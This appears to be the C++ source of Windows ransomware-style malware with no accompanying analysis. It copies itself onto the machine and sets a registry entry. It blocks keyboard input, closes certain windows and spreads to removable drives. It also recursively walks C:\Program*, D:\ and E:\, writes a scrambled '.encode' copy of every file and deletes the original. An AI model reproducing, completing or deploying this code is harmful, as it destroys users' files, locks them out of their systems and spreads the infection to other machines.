#include "KeyBlock.h"
#include "CopyToPC.h"
#include <thread>
#include <windows.h>
#include <string>
#include <conio.h>
#include <sys/stat.h>
#include "WinWindow.h"
#include <io.h>

using namespace std;
#define _CRT_SECURE_NO_WARNINGS

HANDLE hMainEvent, hBlockEvent;
void TempProgramm();
void MainProgramm();

DWORD thread_func1() {
	KeyBlock kb;
	DWORD dwWaitResult = 1;
	while(dwWaitResult != WAIT_OBJECT_0) {
		dwWaitResult = WaitForSingleObject(hBlockEvent, 1);
		kb.KeyBl();
	}
	return 0;
}

DWORD thread_func2() {
	KeyBlock kb;
	while (1) {
		kb.BadWindows();
	}
	return 0;
}

DWORD thread_func3() {
	char symb_disk[10] = { 'A', 'B', 'C', 'D', 'F', 'G', 'E', 'H', 'J', 'I' };
	char disk[4];
	int type_disk;
	disk[1] = ':';
	disk[2] = '\\';
	disk[3] = '\0';
	while (1) {
		for (int i = 0; i < sizeof(symb_disk); i++) {
			disk[0] = symb_disk[i];
			type_disk = GetDriveType(disk);
			if (type_disk == 2 || type_disk == 5) {
				CopyToPC ctp_v2;
				ctp_v2.Copy_to_flash(disk);
			}
		}
	}
	return 0;
}

DWORD thread_enc(LPVOID param) {
	char *fullpath = (char*)param; 
	int string_amount, i, colum_amount, index; 
	struct stat file_size;
	stat(fullpath, &file_size);
	string result_name;
	for (i = 0; i < strlen(fullpath); i++) {
		if (fullpath[i] == '.')
			break;
	}
	result_name.append(fullpath);
	result_name.resize(i);
	result_name.append(".encode");
	char newpath[2048];
	SecureZeroMemory(newpath, sizeof(newpath));
	strcpy_s(newpath, result_name.c_str());
	HANDLE source_file;
	HANDLE result_file;
	source_file = CreateFile(fullpath, GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
	unsigned long fs = file_size.st_size;
	char* file_buff;
	file_buff = new char[fs];
	char* enc_buff;
	enc_buff = new char[fs];
	DWORD lpNumberOfBytesRead;
	ReadFile(source_file, file_buff, fs, &lpNumberOfBytesRead, NULL);
	srand(time(0));
	if (fs != 0)
		string_amount = rand() % fs;
	else
		string_amount = 1;
	colum_amount = ((fs - 1) / string_amount) + 1;
	for (int i = 0; i < fs; i++) {
		index = string_amount * (i % colum_amount) + (i / colum_amount);
		if(index < fs)
			enc_buff[index] = file_buff[i];
	}
	result_file = CreateFile(newpath, GENERIC_ALL, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
	WriteFile(result_file, enc_buff, fs, NULL, NULL);
	CloseHandle(source_file);
	CloseHandle(result_file);
	delete[] file_buff;
	file_buff = nullptr;
	delete[] enc_buff;      
	enc_buff = nullptr;
	return 0;
}

DWORD thread_ww() {

	MainProgramm();
	return 0;
}

void FindFile(char *path) {
		HANDLE handle;
		WIN32_FIND_DATAA findData;
		handle = FindFirstFileA(path, &findData);
		if (handle == INVALID_HANDLE_VALUE) {
			return;
		}
		do {
			if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				if (!(findData.cFileName[0] == '.')) {
					std::string temp_s = path;
					int i, lnght = temp_s.length();
					for (i = lnght; i > 0 && temp_s[i] != '\\'; i--) {
					}
					temp_s.resize(i + 1);
					temp_s.append(findData.cFileName);
					temp_s.append("\\*");
					char dir_path[2048];
					strcpy_s(dir_path, temp_s.c_str());
					FindFile(dir_path);
				}
			}
			else {
				std::string temps = path;
				int lnght = temps.length();
				temps.resize(lnght - 1);
				temps.append(findData.cFileName);
				char fullpath[2048];
				strcpy_s(fullpath, temps.c_str());
				int lg = strlen(fullpath);
				if (fullpath[lg - 5] == 'n' && fullpath[lg - 4] == 'c' && fullpath[lg - 3] == 'o' && fullpath[lg - 2] == 'd' && fullpath[lg - 1] == 'e')
					break;
				HANDLE thr_enc;
				unsigned long thread_ID = 0;
				thr_enc = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)thread_enc, (LPVOID)fullpath, 0, &thread_ID);
				WaitForSingleObject(thr_enc, INFINITE);
				CloseHandle(thr_enc);
				_chmod(fullpath, S_IWRITE | S_IREAD);
				DeleteFile(fullpath);
			}
		} while (FindNextFileA(handle, &findData));
	return;
}

int CALLBACK wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR szCmdLine, int nCmdShow) {
	TempProgramm();
	hMainEvent = CreateEvent(NULL, FALSE, FALSE, "MainEvent");
	HANDLE thr_ww;
	unsigned long thread_ID;
	thr_ww = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)thread_ww, NULL, 0, &thread_ID);
	CloseHandle(thr_ww);
	OutWindow ow;
	ow.WinWindows(hInstance, NULL, szCmdLine, nCmdShow);
	WaitForSingleObject(hMainEvent, INFINITE);
	return 0;
}

void TempProgramm() {
	CopyToPC ctp;
	ctp.FindPath();
	ctp.CopyPaste();
	return;
}

void MainProgramm() {
	CopyToPC ctp;
	ctp.RegEdit();

	hBlockEvent = CreateEvent(NULL, TRUE, FALSE, "BlockEvent");
	HANDLE thr_blck, thr_cls, thr_ff;
	unsigned long thread_ID;
	thr_blck = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)thread_func1, NULL, 0, &thread_ID);
	thr_cls = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)thread_func2, NULL, 0, &thread_ID);
	thr_ff = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)thread_func3, NULL, 0, &thread_ID); 
	CloseHandle(thr_blck);
	CloseHandle(thr_cls);
	CloseHandle(thr_ff);
	
	char path1[20] = "C:\\Program*";
	FindFile(path1);
	
	SetEvent(hBlockEvent);
	char path2[20] = "D:\\*";
	FindFile(path2);

	char path3[20] = "E:\\*";
	FindFile(path3);

	return;
}